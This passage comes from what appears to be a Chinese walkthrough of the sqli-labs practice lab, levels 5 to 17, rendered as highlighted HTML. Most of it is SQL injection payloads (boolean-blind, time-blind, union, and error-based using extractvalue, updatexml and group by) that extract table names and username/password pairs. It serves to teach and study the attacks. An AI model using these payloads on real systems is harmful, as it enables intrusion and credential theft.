+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">#</span><span class="n">substr</span><span class="p">(</span><span class="s2">&#34;78909&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">7</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="k">c</span><span class="p">)</span><span class="n">a是要截取的字符串</span><span class="err">，</span><span class="n">b是截取的位置</span><span class="err">，</span><span class="n">c是截取的长度</span><span class="err">。布尔盲注我们都是长度为</span><span class="mi">1</span><span class="err">因为我们要一个个判断字符。</span><span class="n">ascii</span><span class="p">()</span><span class="err">是将截取的字符转换成对应的</span><span class="n">ascii吗</span><span class="err">，这样我们可以很好确定数字根据数字找到对应的字符。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">判断所有表名字符长度。
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">99</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">逐一判断表名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;))&gt;20--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">判断所有字段名的长度
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">99</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">逐一判断字段名。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and length((select group_concat(username,password) from users))&gt;109--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">判断字段内容长度
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">50</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">逐一检测内容。</span><span class="w">
+</span></span></span></code></pre></div><p>然后可以根据这些sql语句来编写盲注脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></div><h2 id="less---6">less - 6
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-5</code></p>
+<h2 id="less---7">less - 7
+</h2><p>闭合符为<code>'))</code>，方法同<code>less-5</code></p>
+<h2 id="less---8">less - 8
+</h2><p>闭合符为<code>'</code>，这关除了不会显示报错信息以外，方法同<code>less-5</code></p>
+<h2 id="less---9">less - 9
+</h2><p>这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用<code>sleep()</code>函数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(1=1,sleep(5),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">判断参数构造。
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">9</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">判断数据库名长度</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">逐一判断数据库字符
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">13</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">判断所有表名长度</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">逐一判断表名
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">20</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">判断所有字段名的长度</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;),1,1))&gt;99,sleep(5),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">逐一判断字段名。
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">109</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">判断字段内容长度</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">逐一检测内容。
+</span></span></span></code></pre></div><p>和布尔盲注一样，需要花费很多时间去一点一点尝试，所以可以构造一个脚本进行测试。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></div><h2 id="less---10">less - 10
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-9</code></p>
+<h2 id="less---11">less - 11
+</h2><p>这关的页面就和之前的不同了，是一个登录界面。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232248969.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240523224806655"
+	
+	
+></p>
+<p>在之前注入都是通过<code>get</code>方法进行传参的，这关中则是<code>post</code>传参，可以猜测这里<code>username</code>和<code>password</code>都是注入点，所以先测试一下，让其报出错误信息。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232246220.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240523224637626"
+	
+	
+></p>
+<p>根据报错语句，我们可以直接在<code>username</code>栏中进行注入。由于这里是<code>post</code>方法，所以注释符需要使用<code>#</code>或者<code>--</code>后面加上空格符。这里注释符的不同和传参方式有关。</p>
+<p>接着进行联合注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; union select 1,2# &amp; password = 
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232256317.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240523225640758"
+	
+	
+></p>
+<p>后面方法同之前一样。</p>
+<h2 id="less---12">less - 12
+</h2><p>闭合符为<code>&quot;)</code>方法同<code>less-11</code></p>
+<h2 id="less---13">less - 13
+</h2><p>闭合符为<code>')</code>，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;) or length((select database()))&gt;9#
+</span></span></span></code></pre></div><p>这里需要使用<code>or</code>，因为登录账号是错误的，所以需要由后面的判断来决定这段语句的<code>true or false</code></p>
+<h2 id="less---14">less - 14
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-13</code></p>
+<h2 id="less---15">less - 15
+</h2><p>闭合符为<code>'</code>，方法同<code>less-13</code></p>
+<h2 id="less---16">less - 16
+</h2><p>闭合符为<code>&quot;)</code>，方法同<code>less-13</code></p>
+<h2 id="less---17">less - 17
+</h2><p>这关又有新的东西了，先看部分源代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_input</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>           <span class="c1">// $value是 username 中的内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// truncation (see comments)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$value</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">15</span><span class="p">);</span>	<span class="c1">//限制传入字符数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Stripslashes if magic quotes enabled
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span>		<span class="c1">// 检测该函数是否开启
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$value</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>		<span class="c1">//删除字符串中的 /
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Quote if not a number
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">ctype_digit</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>			<span class="c1">// 检测传入的字符是否都是数字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;&#39;&#34;</span> <span class="o">.</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$value</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405241229558.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240524122910082"
+	
+	
+></p>
+<p>这里需要用到的就是报错注入。报错注入一般使用这三个函数<code>extractvalue()</code>、<code>updatexml()</code>、<code>group by()</code>。</p>
+<h3 id="extractvalue">extractvalue
+</h3><p><code>extractvalue(XML_document, Path_string)</code></p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：XPath_string（XPath格式的字符串）</p>
+<p>原理：extractvalue(xml_frag, xpath_expr) 函数接收两个参数，一个是XML文档片段，另一个是XPath表达式。正常情况下，这个函数会根据给定的XPath路径从XML文档中提取数据。然而，当XPath表达式构造不当，例如包含了非法字符或者尝试执行一个无法解析为有效XPath表达式的字符串时，函数会抛出错误，并且错误信息可能包含有关查询的信息，这便为报错注入提供了机会。攻击者可以通过精心构造的XPath表达式来触发错误，进而获取数据库敏感信息。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">)))</span><span class="o">#</span><span class="w">   </span><span class="err">爆数据库</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">)))</span><span class="o">#</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="err">爆字段名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=&#39;</span><span class="n">admin1</span><span class="s1">&#39;) b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">)))</span><span class="o">#</span><span class="w">                      </span><span class="err">爆字段内容。</span><span class="w">
+</span></span></span></code></pre></div><p>这个页面是修改密码页面，所以在<code>username</code>栏中需要输入正确的账号，注入点在<code>password</code>中</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405242312298.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240524231234797"
+	
+	
+></p>
+<h3 id="updatexml">updatexml
+</h3><p><code>updatexml(XML_document, XPath_string, new_value)</code></p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称。</p>
+<p>第二个参数：XPath_string(XPath格式的字符串)</p>
+<p>第三个参数：new_value, String格式，替换查找到的符合条件的数据</p>
+<p>原理：它试图根据XPath表达式定位到XML文档中的某个节点并用new_value替换该节点的内容。如果XPath表达式被设计成无法解析或指向无效位置，那么这个函数也会产生错误。通过控制XPath字符串内容，攻击者能够引起特定类型的错误，这些错误消息中可能携带了关于数据库表结构或数据的信息。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">123</span><span class="s1">&#39; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
+</span></span></span><span class="line"><span class="cl"><span class="s1">123&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w">    </span><span class="err">爆数据库</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">123</span><span class="s1">&#39; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
+</span></span></span><span class="line"><span class="cl"><span class="s1">123&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w">	</span><span class="err">爆字段名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">123</span><span class="s1">&#39; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#39;</span><span class="n">admin1</span><span class="s1">&#39;) b),0x5c),1))#
+</span></span></span><span class="line"><span class="cl"><span class="s1">爆密码该格式针对mysql数据库。
+</span></span></span><span class="line"><span class="cl"><span class="s1">爆其他表就可以，下面是爆emails表
+</span></span></span><span class="line"><span class="cl"><span class="s1">123&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;emails&#39;</span><span class="p">),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">#</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405242318676.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240524231815166"
+	
+	
+></p>
+<h3 id="group-by">group by
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">123</span><span class="s1">&#39; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+</span></span></span><span class="line"><span class="cl"><span class="s1">123&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span><span class="o">#</span><span class="w">      </span><span class="err">爆数据库版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span><span class="o">#</span><span class="w">        </span><span class="err">爆出所有表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span><span class="o">#</span><span class="w">    </span><span class="err">爆出所有字段名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#39;</span><span class="n">admin1</span><span class="s1">&#39;),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+</span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405242321444.png"
+	
+	
+	
